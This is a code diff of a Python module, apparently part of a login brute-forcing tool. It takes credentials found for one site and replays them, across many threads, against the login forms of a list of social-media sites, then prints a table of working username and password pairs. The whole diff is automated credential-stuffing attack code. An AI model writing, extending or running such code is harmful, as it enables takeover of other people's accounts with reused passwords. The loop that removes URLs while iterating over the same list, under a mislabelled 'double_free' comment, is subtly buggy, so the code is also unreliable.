@@ -16,77 +16,82 @@ def do_job(jobs):
 
 	for job in jobs:
 		job.join()
+		
+def submit(optionURL, tryCreds, optionProxy, optionVerbose, result):
+
+	try:
+		proc = tbrowser.startBrowser()
+
+		proc.addheaders = [('User-Agent', tbrowser.useragent())]
+
+		utils.printf("[+] Checking %s" %(optionURL))
+
+		proc.open(optionURL)
+		loginInfo = tbrowser.parseLoginForm(proc.forms())
+
+	except Exception as err:
+		if optionVerbose:
+			utils.printf("[x] ReAuth: %s" %(err), "bad")
+		
+
+	if not loginInfo:
+		if optionVerbose:
+			utils.printf("[x] ReAuth: Can't find login form at %s" %(optionURL), "bad")
+	else:
+		try:
+			loginbrute.submit(
+				optionURL, tryCreds[::-1], optionProxy, # Reverse username + password. Dynamic submit in loginbrute
+				"", optionVerbose, loginInfo, result, True # No key false by default, result now should be url
+			)
+		except Exception as err:
+			if optionVerbose:
+				utils.printf("[x] ReAuth: Submitting error for %s" %(err), "bad")
 
 def run(checkedURL, creds, optionThreads, optionProxy, optionVerbose):
-	# def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginInfo, result):
 	social_urls = data.social_urls().replace("\t", "").split("\n")
+
+	for url in social_urls:
+		# BUG double_free() 
+		if checkedURL in url:
+			social_urls.remove(url)
 
 
 	result = Queue()
 	workers = []
 
 	try:
-		for optionURL in social_urls:
-			if checkedURL.split("/")[2] in optionURL:
-				pass #TODO improve this idea by remove it before doing
-			else:
-				# TODO add exception
-				# TODO better threads: this thread is shits
-				# both checking and doing in threading
-				# currently checking is single threads
-				# create new function that checking and calling (without thread)
-				# Threading it
-				utils.printf("[+] Checking %s" %(optionURL))
-		
-				proc = tbrowser.startBrowser()
+		for tryCreds in creds:
+			for url in social_urls:
+				if actions.size_o(workers) == optionThreads:
+					do_job(workers)
+					del workers[:]
 
-				proc.addheaders = [('User-Agent', tbrowser.useragent())]
-				proc.open(optionURL)
-				loginInfo = tbrowser.parseLoginForm(proc.forms())
-				if not loginInfo:
-					pass # TODO Alert here
-				else:
-					try:
-						if optionVerbose:
-							utils.printf("[*] Form ID: %s\n  [*] Username field: %s\n  [*] Password field: %s"
-								%(loginInfo[0], loginInfo[1][0], loginInfo[1][1]), "good")
-						
-						#TODO add found URL 
-						for tryCred in creds:
-							if actions.size_o(workers) == optionThreads:
-								do_job(workers)
-								del workers[:]
+				worker = threading.Thread(
+					target = submit,
+					args = (url, tryCreds, optionProxy, optionVerbose, result)
+				)
 
-							worker = threading.Thread(
-								target = loginbrute.submit,
-								args = (
-									optionURL, tryCred[::-1], optionProxy, # Reverse username + password. Dynamic submit in loginbrute
-									"", optionVerbose, loginInfo, result, True # No key false by default, result now should be url
-								)
-							)
-							worker.daemon = True
-							workers.append(worker)
+				worker.daemon = True
+				workers.append(worker)
 
-					except Exception as err:
-						utils.die("[x] ReAuth: Setting threads error", err)
+
 		do_job(workers)
 		del workers[:]
 		
 	
-	except KeyboardInterrupt:# as error:
-		# TODO: kill running threads here
+	except KeyboardInterrupt:
 		utils.die("[x] Terminated by user!", "KeyboardInterrupt")
 
-	except SystemExit:# as error
+	except SystemExit:
 		utils.die("[x] Terminated by system!", "SystemExit")
 	
 	except Exception as err:
 		utils.die("[x] ReAuth: Runtime error", err)
 				
 	finally:
-		social_creds = list(result.queue)
+		result = list(result.queue)
 
-		if actions.size_o(social_creds) == 0:
+		if actions.size_o(result) == 0:
 			utils.printf("[-] No extra valid password found", "bad")
 		else:
-			utils.print_table(("Target", "Username", "Password"), *social_creds)
+			utils.print_table(("Target", "Username", "Password"), *result)
